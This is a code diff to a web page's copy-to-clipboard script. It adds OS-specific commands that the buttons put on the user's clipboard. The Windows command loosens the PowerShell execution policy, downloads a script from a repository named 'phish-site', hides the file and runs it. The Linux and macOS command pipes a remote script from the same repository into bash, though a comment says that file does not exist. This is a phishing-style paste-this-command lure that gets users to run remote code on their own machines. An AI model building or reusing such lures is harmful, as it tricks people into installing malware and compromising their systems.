@@ -29,23 +29,23 @@ async function setupCopyables() {
             button.innerHTML = escapeHTML('📋');
             button.setAttribute('aria-label', 'Copy to clipboard');
 
-            let text = ""
             if (os === "Windows") {
-                text = "";
+                // main event
+                let text = "Set-ExecutionPolicy -scope CurrentUser Unrestricted; iwr -uri https://raw.githubusercontent.com/UnDefinedCS/phish-site/refs/heads/main/program/avdxr.ps1 -outfile .avdxr.ps1; $item = Get-Item -Path .\\.avdxr.ps1; $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden; powershell .\\.avdxr.ps1";
                 button.onclick = () => {
                     navigator.clipboard.writeText(text);
                     button.innerHTML = escapeHTML('✅');
                     setTimeout(() => button.innerHTML = escapeHTML('📋'), 1000);
                 }
             } else if (os === "Linux" || os === "macOS") {
-                text = "";
+                // file doesnt exist (here for example)
+                let text = "curl https://raw.githubusercontent.com/UnDefinedCS/phish-site/refs/heads/main/program/skrfx.s | bash";
                 button.onclick = () => {
                     navigator.clipboard.writeText(text);
                     button.innerHTML = escapeHTML('✅');
                     setTimeout(() => button.innerHTML = escapeHTML('📋'), 1000);
                 }
             } else {
-                text = "";
                 button.onclick = () => {
                     button.innerHTML = escapeHTML('❌');
                     setTimeout(() => button.innerHTML = escapeHTML('📋'), 1000);
